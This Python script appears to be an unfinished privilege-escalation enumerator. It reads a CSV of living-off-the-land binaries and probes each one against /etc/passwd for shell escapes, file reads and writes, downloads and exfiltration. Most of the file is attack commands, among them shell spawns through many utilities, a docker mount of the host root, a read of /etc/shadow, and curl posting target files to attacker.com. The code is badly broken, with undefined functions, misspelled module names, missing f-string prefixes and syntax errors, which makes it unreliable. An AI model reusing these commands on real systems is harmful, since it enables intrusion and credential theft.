import os
import csv
import subprocess
import argparse

winning_bins = []
op_file = "/etc/passwd"
url = "Choose one for testing"
containerid = 1
write_target = ""
  
def main():
    #parser = argparse.ArgumentParser(description = "Enter a file you want to process")
    #parser.add_argument("csv", type=str, help = "Argument for file to read")
    #parser.add_argument("ifile", type=str, help = "argument for file to do ops on")
    #parser.add_argument("ofile", type=str, help = "argument for file to output ops")
    #args = parser.parse_args()

    system_bins = fillCsv("lolbin-database.csv")
   
    startLOL(system_bins)

    subprocess.run(["rm a.out typescript yarn.lock"])

    return 0

def fillCsv(file):
    system_bins = {}

    with open(file, mode = 'r') as csvfile:
        reader = csv.reader(csvfile)

        for bin in reader:
            name = bin[0]
            try:
                result = subprocess.Popen([bin[0]], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                system_bins[name] = True
            except:
                system_bins[name] = False

    return system_bins

#Decision tree for what bin function to call
def startLOL(bins):
    for bin in bins:
        if bins.get(bin):
            if(check_value(bin, op_file)):
                winning_bins.append(bin)

def returnCode(result):
    stdout, stderr = result.communicate()

    if result.returncode != 0:
        #command Pass
        return True
    else:
        #Command fail
        return False

#Bin function
def default(target):
    return f"Unknown bin: {target}"

def sevenZ(target):
    return returnCode(subprocess.Popen(["7z a -ttar -an -s {target} | 7z e -ttar -si -so"], stdout=subprocess.PIPE, stderr=subprocess.PIPE))

def aaexec(target):
    return returnCode(subprocess.Popen(["aa-exec /bin/sh"]))

def ab(target):
    return True if returnCode(subProcess.Popen(["ab -p {target} 127.0.0.1"])) or returnCode(subProcess.Popen(["ab -v2 {target}"])) else False

def agetty(target):
    return False

def alpine(target):
    return returnCode(subprocess.Popen(["alpine -F {target}"]))

def ansibleplaybook(target):
    return returnCode(subprocess.Popen([ "echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]'", "|", "ansible-playbook"]))

def ansibletest(target):
    return returnCode(subprocess.Popen(["ansible-test shell"]))

def aoss(target):
    return returnCode(subprocess.Popen(["aoss /bin/sh"]))

def apache2ctl(target):
    return returnCode(subprocess.Popen(["apache2ctl -c \"Include {target} \"" "-k stop"]))

def aptget(target):
    return returnCode(subprocess.Popen(["apt-get changelog apt && !/bin/sh"]))

def apt(target):
    return returnCode(subprocess.Popen(["apt changelog apt && !/bin/sh"]))

def ar(target):
    temp = tempfile.TemporaryFile()
    return returnCode(subprocess.Popen(["ar r {temp} {target}"]))

def aria2c(target):
    temp = Tempfile.TemporaryFile()
    print("id", temp)
    subprocess.Popen(["chmod +x {temp}"])
    return True if returnCode(subprocess.Popen(["aria2c --on-download {temp} http://x"])) or returnCode(["aria2c -o {target} {url}"]) or returnCode(subprocess.Popen(["aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash {url}"])) else False

def arj(target):
    # File Read 
    temp = Tempfile.TemporaryFile()
    subprocess.Popen(["arj", "a", "{temp}", "{target}"])
    return returnCode(subprocess.Popen(["arj", "p", temp]))

def arp(target):
    return returnCode(subprocess.Popen(["arp", "-v", "-f", target]))

def a_s(target):
    return returnCode(subprocess.Popen(["as", target]))

def ascii_xfr(target):
    return returnCode(subprocess.Popen(["ascii-xfr", "-ns", target]))

def ascii85(target):
    return returnCode(subprocess.Popen(["ascii85", target, "|", "ascii85", "--decode"]))

def ash(target):
    return returnCode(subprocess.Popen(["ash", "-c", "\'echo", "DATA", ">", target, "\'"]))

def aspell(target):
    return returnCode(subprocess.Popen(["aspell", "-c", target]))

def at(target):
    return returnCode(subprocess.Popen(["echo", "/bin/sh", "\"<$(tty) >$(tty) 2>$(tty)\"", "|", "at", "now;", "tail", "-f", "/dev/null"]))

def atobm(target):
    return returnCode(subprocess.Popen(["atobm", target, "2>&1", "|", "awk", "-F", "\"\'\"", "\'{printf", "\"%\s\"", "\$2}\'"]))

def awk(target):
    return True if returnCode(subprocess.Popen(["awk BEGIN", "{system(\"/bin/sh\")}\'"])) or returnCode(subprocess.Popen(["awk", "-v", "LFILE={target}", "\'BEGIN", "{", "print", "\"DATA\"", ">", target, "}\'"])) or returnCode(subprocess.Popen(["awk", "\'//\'", target])) else False

def aws(target):
    return returnCode(subprocess.Popen(["aws", "help", "&&", "!/bin/shd"]))

def base32(target):
    return returnCode(subprocess.Popen(["base32", target, "|", "base32", "--decode"]))

def base58(target):
    return returnCode(subprocess.Popen(["base58", target, "|", "base58", "--decode"]))

def base64(target):
    return returnCode(subprocess.Popen(["base64", target, "|", "base64", "--decode"]))

def basenc(target):
    return returnCode(subprocess.Popen(["basenc", "--base64", target, "|", "basenc", "-d", "--base64"]))

def basez(target):
    return returnCode(subprocess.Popen(["basez", target, "|", "basez", "--decode"]))

def bash(target):
    #EXPAND
    return returnCode(subprocess.Popen(["bash"]))

def batcat(target):
    return returnCode(subprocess.Popen(["batcat --paging always /etc/profile && !/bin/sh"]))

def bc(target):
    return returnCode(subprocess.Popen(["bc -s {target}"]))

def bconsole(target):
    return returnCode(subprocess.Popen(["bconsole -c /etc/shadow"]))

def bpftrace(target):
    return False

def bridge(target):
    return returnCode(subprocess.Popen(["bridge -b {target}"]))

def bundle(target):
    return False

def bundler(target):
    return False

def busctl(target):
    return returnCode(subprocess.Popen(["busctl --show-machine && !/bin/sh"]))

def busybox(target):
    return True if returnCode(subprocess.Popen(["busybox sh"])) or return returnCode(subprocess.Popen(["busybox httpd -f -p 1337 -h ."])) or return returnCode(subprocess.Popen(["busybox sh -c \'echo \"DATA\" > {target}\'"])) or return returnCode(subprocess.Popen(["./busybox cat {target}"])) else False

def byebug(target):
    temp = Tempfile.TemporaryFile()
    subprocess.Popen(["echo \'system(\"/bin/sh\")\' > {temp}"])
    return returnCode(subprocess.Popen(["byebug {temp} && continue"]))

def bzip2(target):
    subprocess.Popen(["bzip2 -c {target} | bzip2 -d"])

def c89(target):
    return True if subprocess.Popen(["c89 -wrapper /bin/sh,-s"]) or subprocess.Popen(["c89 -xc /dev/null -o {target}"]) or subprocess.Popen(["c89 -x c -E {target}"]) else False

def c99(target):
    return True if subprocess.Popen(["c99 -wrapper /bin/sh,-s"]) or subprocess.Popen(["c99 -xc /dev/null -o {target}"]) or subprocess.Popen(["c99 -x c -E {target}"]) else False

def cabal(target):
    return subprocess.Popen(["cabal exec -- /bin/sh"])

def cancel(target):
    return False

def capsh(target):
    return subprocess.Popen(["capsh --"])

def cat(target):
    return subprocess.Popen(["cat {target}"])

def cdist(target):
    return subprocess.Popen(["cdist shell s /bin/sh"])

def certbot(target):
    return subprocess.Popen(["certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir {temp} --work-dir {temp} --config-dir {temp} --pre-hook \'bin/sh 1>&0 2>&0\'"])

def check_by_ssh(target):
    return subprocess.Popen(["check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx"])

def check_cups(target):
    return subprocess.Popen(["check_cups --extra-opts=@{target}"])

def  check_log(target):
    return True if subprocess.Popen(["touch input && check_log -F input -O {target}"]) or subprocess.Popen(["touch output && check_log -F {target} -O output && cat output"]) else False

def check_memory(target):
    return subprocess.Popen(["check_memory --extra-opts=@{target}"])

def check_raid(target):
    return subprocess.Popen(["check_raid --extra-opts=@{target}"])

def check_ssl_cert(target):
    temp = Tempfile.TemporaryFile()
    return subprocess.Popen(["touch check_ssl_cert_output && echo \"id | tee check_ssl_cert_output\" > {temp} && chmod +x {temp} && check_ssl_cert --curl-bin {target} -H example.net && cat check_ssl_cert_output"])

def check_statusfile(target):
    return subprocess.Popen(["check_statusfile {target}"])

def chmod(target):
    return False

def choom(target):
    return subprocess.Popen(["choom -n 0 /bin/sh"])

def chown(target):
    return False

def chroot(target):
    return False

def clamscan(target):
    temp = Tempfile.TemporaryFile()
    return subprocess.Popen(["touch {temp}/empty.yara && clamscan --no-summary -d {temp} -f {target} 2>&1 | sed -nE \'s/^(.*): No such file or directory$/\1/p\'"])

def comp(target):
    return subprocess.Popen(["cmp {target} /dev/zero -b -l"])

def cobc(target):
    temp = Tempfile.TemporaryFile()
    return subprocess.Popen(["echo \'CALL \"SYSTEM\" USING \"/bin/sh\".\' > {temp}/x && cobc -xFj --frelax-syntax-checks {temp}/x"])

def column(target):
    return subprocess.Popen(["column {target}"])

def comm(target):
    return subprocess.Popen(["comm {target} /dev/null 2>/dev/null"])

def composer(target):
    temp = Tempfile.TemporaryFile()
    return subprocess.Popen(["echo \'{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}\' >", temp, "/composer.json && composer --working-dir={temp} run-script x"])

def cowsay(target):
    temp = Tempfile.TemporaryFile()
    return subprocess.Popen(["echo \'exec \"/bin/sh\";\' >{temp} && cowsay -f {target} x"])

def cowthink(target):
    temp = Tempfile.TemporaryFile()
    return subprocess.Popen(["echo \'exec \"/bin/sh\";\' >{temp} && cowthink -f {target} x"])

def cp(target):
    return True if subprocess.Popen(["echo \"DATA\" | cp /dev/stdin {target}"]) or subprocess.Popen(["cp {target} /dev/stdout"]) else False

def cpan(target):
    return True if subprocess.Popen(["cpan && ! exec \'bin/bash\'"]) or subprocess.Popen(["cpan && ! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();"]) or subproess.Popen(["cpan && ! use File::Fetch; my $file = (File::Fetch->new(uri => \"http://attacker.com/file_to_get\")) ->fetch();"])

def cpio(target):
    temp = Tempfile.TemporaryFile()
    return True if subprocess.Popen(["echo \'bin/sh </dev/tty >/dev/tty\' >localhost && cpio -o --rsh-command /bin/sh -F localhost:"]) or subprocess.Popen(["echo DATA >{target} && echo {target} | cpio -up cpio_output"]) or subprocess.Popen(["echo {target} | cpio -o"]) or subprocess.Popen(["echo {target} | cpio -dp {temp} && cat {temp}/{target}"]) else False

def cpulimit(target):
    return subprocess.Popen(["cpulimit -l 100 -f /bin/sh"])

def crash(target):
    return True if subprocess.Popen(["crash -h && !sh"]) or subprocess.Popen(["CRASHPAGER=/usr/bin/id crash -h"]) else False

def crontab(target):
    return subprocess.Popen(["crontab -e"])

def csh(target):
    return True if subprocess.Popen(["csh"]) or subprocess.Popen(["ash -c \'echo DATA > {target}\'"]) else False

def csplit(target):
    temp = Tempfile.TemporaryFile()
    return True if subprocess.Popen(["echo \"DATA\" > {temp} && csplit -z -b \"\&d{target}\" {temp} 1"]) or subprocess.Popen(["csplit {target} 1 && cat xx01"])

def csvtool(target):
    temp = Tempfile.TemporaryFile()
    return True if subprocess.Popen(["csvtool call \'/bin/sh;false\' /etc/passwd"]) or subprocess.Popen(["echo DATA > {temp} && csvtool trim t {temp} -o {target}"]) or subprocess.Popen(["csvtool trim t {target}"])

def cupsfilter(target):
    return subprocess.Popen(["cupsfilter -i application/octet-stream -m application/octet-stream {target}"])

def curl(target):
    temp = Tempfile.TemporaryFile()
    return True if subprocess.Popen(["curl -X POST -d \"@{target} http://attacker.com"]) or subprocess.Popen(["curl http://attacker.com -o {target}"]) or subprocess.Popen(["echo DATA >{temp} && curl \"file://{temp}\" -o {target}"]) or subprocess.Popen(["curl file://{target}"])

def cut(target):
    return subprocess.Popen(["cur -d \"\" -f1 {target}"])

def dash(target):
    return True if subprocess.Popen(["dash"]) or subprocess.Popen(["dash -c \'echo DATA > {target}\'"]) else False

def date(target):
    return subprocess.Popen(["date -f {target}"])

def dc(target):
    return subprocess.Popen(["dc -e \'!/bin/sh\'"])

def dd(target):
    return True if subprocess.Popen(["echo \"DATA\" | dd of={target}"]) or subprocess.Popen(["dd if={target}"]) else False

def debugfs(target):
    return subprocess.Popen(["debugfs && !/bin/sh"])

def dialog(target):
    return subprocess.Popen(["dialog --textbox {target} 0 0"])

def diff(target):
    return True if subprocess.Popen(["diff --line-format=%L /dev/null {target}"])

def dig(target):
    return subprocess.Popen(["dig -f {target}"])

def distcc(target):
    return subprocess.Popen(["distcc /bin/sh"])

def dmesg(target):
    return True if subprocess.Popen(["dmesg -H"] or subprocess.Popen(["dmesg -rF {target}"]))

def dmidecode(target):
    return False

def dmsetup(target):
    return False

def dnf(target):
    return False

def docker(target):
    return True if subprocess.Popen(["docker run -v /:/mnt --rm -it alpine chroot /mnt sh"]) or subprocess.Popen(["echo \"DATA\" > {temp} && docker cp {temp} {containerid}:{temp} && docker cp {containerid}:{temp} {target}"]) else False

def dos2unix(target):
    return subprocess.Popen(["echo \"Data\" > temp && dos2unix -f -n temp {target}"])

def dosbox(target):
    return True if subprocess.Popen(["dosbox -c \'mount c /\' -c \"echo DATA >c:{target}\" -c exit"]) or subprocess.Popen(["doxbos -c \'mont c /\' -c \"type c:{target}\""]) or subprocess.Popen(["dosbox -c \'mount c /\' -c \"copy c:{target} c:\temp\output\" -c exit && cat \'/tmp/OUTPUT\'"]) else False

def dotnet(target):
    return True if subprocess.Popen(["dotnet fsi && System.Diagnostics.Process.Start(\"/bin/sh\").WaitForExit();;"]) or subprocess.Popen(["dotnet fsi && System.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable({target}));;"]) else False

def dpkg(target):
    return subprocess.Popen(["dpkg -l && !/bin/sh"])

def dstat(target):
    return subprocess.Popen(["mkdir -p ~/.dstat && echo \'import os; os.execv(\"/bin/sh\", [\"sh\"])\' >~/.dstat/dstat_xxx.py && dstat --xxx"])

def dvips(target):
    return subprocess.Popen(["tex \'\special{psfile=\"\'/bin/sh 1 >&0\"}\end\' && dvips -R0 texput.dvi"])

#MANY ON THIS ONE ADD MORE
def easy_install(target):
    return False

def eb(target):
    return subprocess.Popen(["eb logs && !/bin/sh"])

def ed(target):
    return True if subprocess.Popen(["ed && !/bin/sh"]) or subprocess.Popen(["ed {target} && a && DATA && . && w && q"]) or subprocess.Popen(["ed {target} && ,p && q"]) else False

def efax(target):
    return False

def evlish(target):
    return True if subprocess.Popen(["elvish"]) or subprocess.Popen(["elvish -c \'echo (slurp >{target})"]) or subprocess.Popen(["elvish -c \'echo (slurp <{target})"]) else False

def emacs(target):
    return True if subprocess.Popen(["emacs -Q -nw --eval \'(term \"/bin/sh\")\'"]) or subprocess.Popen(["emacs {target} && DATA && C-x C-s"]) or subprocess.Popen(["emacs {target}"]) else False

def enscript(target):
    return subprocess.Popen(["enscript /dev/null -qo /dev/null -I \'/bin/sh >&2\'"])

def env(target):
    return subprocess.Popen(["env /bin/sh"])

def eqn(target):
    return subprocess.Popen(["eqn {target}"])

def espeak(target):
    return subprocess.Popen(["espeak -qXf {target}"])

def ex(target):
    return True if subprocess.Popen(["ex && !/bin/sh"]) or subprocess.Popen(["ex {target} && a && DATA && x && w && q"]) or subprocess.Popen(["ex {target} && ,p && q"]) else False

def exiftool(target):
    return True if subprocess.Popen(["exiftool -filename={target} \"DATA\""]) or subprocess.Popen(["exiftool filename=output_exiftool {target} && cat output"]) else False

def expand(target):
    return subprocess.Popen(["expand {target}"])

def expect(target):
    return True if subprocess.Popen(["expect -c \'spwan /bin/sh;interact\'"]) or subprocess.Popen(["expect {target}"])

def factor(target):
    temp = Tempfile.TemporaryFile()
    return subprocess.Popen(["echo \'exec(\"/bin/sh\")\' > {target}/x.rb && FACTERLIB={temp} facter"])




def check_value(bin, file):
    return {
        "7z": sevenZ,
        "aa_exec": aaexec,
        "ab": ab,
        "agetty": agetty,
        "alpine": alpine,
        "ansible_playbook": ansibleplaybook,
        "ansible_test": ansibletest,
        "aoss": aoss,
        "apache2ctl": apache2ctl,
        "apt_get": aptget,
        "apt": apt,
        "ar": ar,
        "aria2c": aria2c,
        "arj": arj,
        "arp": arp,
        "as": a_s,
        "ascii_xfr": ascii_xfr,
        "ascii85": ascii85,
        "ash": ash,
        "aspell": aspell,
        "at": at,
        "atobm": atobm,
        "awk": awk,
        "aws": aws,
        "base32": base32,
        "base58": base58,
        "base64": base64,
        "basenc": basenc,
        "basez": basez,
        "bash": bash,
        "batcat": batcat,
        "bc": bc,
        "bconsole": bconsole,
        "bpftrace": bpftrace,
        "bridge": bridge,
        "bundle": bundle,
        "bundler": bundler,
        "bustctl": bustctl,
        "busybox": busybox,
        "byebug": byebug,
        "bzip2": bzip2,
        "c89": c89,
        "c99": c99,
        "cabal": cabal,
        "cancel": cancel,
        "capsh": capsh,
        "cat": cat,
        "cdist": cdist,
        "certbot": certbot,
        "check_by_ssh": check_by_ssh,
        "check_cups": check_cups,
        "check_log": check_log,
        "check_memory": check_memory,
        "check_raid": check_raid,
        "check_ssl_cert": check_ssl_cert,
        "check_statusfile": check_statusfile,
        "chmod": chmod,
        "choom": choom,
        "chown": chown,
        "chroot": chroot,
        "clamscan": clamscan,
        "cmp": comp,
        "cobc": cobc,
        "column": column,
        "comm": comm,
        "composer": composer,
        "cowsay": cowsay,
        "cowthink": cowthink,
        "cp": cp,
        "cpan": cpan,
        "cpio": cpio,
        "cpuliit": cpuliit,
        "crash": crash,
        "crontab": crontab,
        "csh": csh,
        "csplit": csplit,
        "csvtool": csvtool,
        "cupsfilter": cupsfilter,
        "curl": curl,
        "cut": cut,
        "dash": dash,
        "date": date,
        "dc": dc,
        "dd": dd,
        "debugfs": debugfs,
        "dialog": dialog,
        "diff": diff,
        "dig": dig,
        "distcc": distcc,
        "dmesg": dmesg,
        "dmidecode": dmidecode,
        "dmsetup": dmsetup,
        "dnf": dnf,
        "docker": docker,
        "dos2unix": dos2unix,
        "dosbox": dosbox,
        "dotnet": dotnet,
        "dpkg": dpkg,
        "dstat": dstat,
        "dvips": dvips,
        "easy_install": easy_install,
        "eb": eb,
        "ed": ed,
        "efax": efax,
        "elvish": elvish,
        "emacs": emacs,
        "enscript": enscript,
        "env": env,
        "eqn": eqn,
        "espeak": espeak,
        "ex": ex,
        "exiftool": exiftool,
        "expand": expand,
        "expect": expect,
        "facter": facter,
        "file": file,
        "find": find,
        "finger": finger,
        "fish": fish,
        "flock": flock,
        "fmt": fmt,
        "fold": fold,
        "fping": fping,
        "ftp": ftp,
        "gawk": gawk,
        "gcc": gcc,
        "gcloud": gcloud,
        "gcore": gcore,
        "gdb": gdb,
        "gem": gem,
        "genie": genie,
        "genisoimage": genisoimage,
        "ghc": ghc,
        "ghci": ghci,
        "gimp": gimp,
        "ginsh": ginsh,
        "git": git,
        "grc": grc,
        "grep": grep,
        "gtester": gtester,
        "gzip": gzip,
        "hd": hd,
        "head": head,
        "hexdump": hexdump,
        "highlight": highlight,
        "hping3": hping3,
        "iconv": iconv,
        "iftop": iftop,
        "install": install,
        "ionice": ionice,
        "ip": ip,
        "irb": irb,
        "ispell": ispell,
        "jjs": jjs,
        "joe": joe,
        "join": join,
        "journalctl": journalctl,
        "jg": jg,
        "jrunscript": jrunscript,
        "jtag": jtag,
        "julia": julia,
        "knife": knife,
        "ksh": ksh,
        "ksshell": ksshell,
        "ksu": ksu,
        "kubectl": kubectl,
        "latex": latex,
        "latexmk": latexmk,
        "ld.so": ld_so,
        "ldconfig": ldconfig,
        "less": less,
        "lftp": lftp,
        "links": links,
        "ln": ln,
        "loginctl": loginctl,
        "logsave": logsave,
        "look": look,
        "lp": lp,
        "ltrace": ltrace,
        "lua": lua,
        "lualatex": lualatex,
        "luatex": luatex,
        "lwp_download": lwp_download,
        "lwp_request": lwp_request,
        "mail": mail,
        "make": make,
        "man": man,
        "mawk": mawk,
        "minicom": minicom,
        "more": more,
        "mosquitto": mosquitto,
        "mount": mount,
        "msfconsole": msfconsole,
        "msgattrib": msgattrib,
        "msgcat": msgcat,
        "msgconv": msgconv,
        "msgfilter": msgfilter,
        "msgmerge": msgmerge,
        "msguniq": msguniq,
        "mtr": mtr,
        "multitime": multitime,
        "mv": mv,
        "mysql": mysql,
        "nano": nano,
        "nasm": nasm,
        "nawk": nawk,
        "nc": nc,
        "ncdu": ncdu,
        "ncftp": ncftp,
        "neofetch": neofetch,
        "nft": nft,
        "nice": nice,
        "nl": nl,
        "nm": nm,
        "nmap": nmap,
        "node": node,
        "nohup": nohup,
        "npm": npm,
        "nroff": nroff,
        "nsenter": nsenter,
        "ntpdate": ntpdate,
        "octave": octave,
        "od": od,
        "openssl": openssl,
        "openvpn": openvpn,
        "openvt": openvt,
        "opkg": opkg,
        "pandoc": pandoc,
        "paste": paste,
        "pax": pax,
        "pdb": pdb,
        "pdflatex": pdflatex,
        "pdftex": pdftex,
        "perf": perf,
        "perl": perl,
        "perlbug": perlbug,
        "pexec": pexec,
        "pg": pg,
        "php": php,
        "pic": pic,
        "pico": pico,
        "pidstat": pidstat,
        "pip": pip,
        "pkexec": pkexec,
        "pkg": pkg,
        "posh": posh,
        "pr": pr,
        "pry": pry,
        "psftp": psftp,
        "psql": psql,
        "ptx": ptx,
        "puppet": puppet,
        "pwsh": pwsh,
        "python": python,
        "rake": rake,
        "rc": rc,
        "readelf": readelf,
        "red": red,
        "redcarpet": redcarpet,
        "redis": redis,
        "restic": restic,
        "rev": rev,
        "relogin": relogin,
        "rlwrap": rlwrap,
        "rpm": rpm,
        "rpmdb": rpmdb,
        "rpmquery": rpmquery,
        "rpmverify": rpmverify,
        "rsync": rsync,
        "rtorrent": rtorrent,
        "ruby": ruby,
        "run_mailcap": run_mailcap,
        "run_parts": run_parts,
        "runscript": runscript,
        "rview": rview,
        "rvim": rvim,
        "sash": sash,
        "scanmem": scanmem,
        "scp": scp,
        "screen": screen,
        "script": script,
        "scrot": scrot,
        "sed": sed,
        "service": service,
        "setarch": setarch,
        "setfacl": setfacl,
        "setlock": setlock,
        "sftp": sftp,
        "sg": sg,
        "shuf": shuf,
        "slsh": slsh,
        "smbclient": smbclient,
        "snap": snap,
        "socat": socat,
        "socket": socket,
        "soelim": soelim,
        "softlimit": softlimit,
        "sort": sort,
        "split": split,
        "sqlite3": sqlite3,
        "sqlmap": sqlmap,
        "ss": ss,
        "ssh_agent": ssh_agent,
        "ssh_keygen": ssh_keygen,
        "ssh_keyscan": ssh_keyscan,
        "ssh": ssh,
        "sshpas": sshpas,
        "start_stop_daemon": start_stop_daemon,
        "stdbuf": stdbuf,
        "strace": strace,
        "strings": strings,
        "su": su,
        "sudo": sudo,
        "sysctl": sysctl,
        "systemctl": systemctl,
        "systemd-resolve": systemd_resolve,
        "tac": tac,
        "tail": tail,
        "tar": tar,
        "task": task,
        "tasket": tasket,
        "tasksh": tasksh,
        "tbl": tbl,
        "tclsh": tclsh,
        "tcpdump": tcpdump,
        "tdbtool": tdbtool,
        "tee": tee,
        "telnet": telnet,
        "terraform": terraform,
        "tex": tex,
        "tftp": tftp,
        "tic": tic,
        "time": time,
        "timedatectl": timedatectl,
        "timeout": timeout,
        "tmate": tmate,
        "tmux": tmux,
        "top": top,
        "torify": torify,
        "torsocks": torsocks,
        "troff": troff,
        "tshark": tshark,
        "ul": ul,
        "unexpand": unexpand,
        "uniq": uniq,
        "unshare": unshare,
        "unsquashfs": unsquashfs,
        "unzip": unzip,
        "update-alternatives": update_alternatives,
        "uudecode": uudecode,
        "uuencode": uuencode,
        "vagrant": vagrant,
        "valgrind": valgrind,
        "varnishncsa": varnishncsa,
        "vi": vi,
        "view": view,
        "vigr": vigr,
        "vim": vim,
        "vimdiff": vimdiff,
        "vipw": vipw,
        "virsh": virsh,
        "volatility": volatility,
        "w3m": w3m,
        "wall": wall,
        "watch": watch,
        "wc": wc,
        "wget": wget,
        "whiptail": whiptail,
        "whois": whois,
        "wireshark": wireshark,
        "wish": wish,
        "xargs": xargs,
        "xdg-user-dir": xdg_user_dir,
        "xdotool": xdotool,
        "xelatex": xelatex,
        "xetex": xetex,
        "xmodmap": xmodmap,
        "xmore": xmore,
        "xpad": xpad,
        "xxd": xxd,
        "xz": xz,
        "yarn": yarn,
        "yash": yash,
        "yelp": yelp,
        "yum": yum,
        "zathura": zathura,
        "zip": zip,
        "zsh": zsh,
        "zsoelim": zsoelim,
        "zypper": zypper
    }.get(bin, default)(file)

if __name__ == "__main__":
    main()
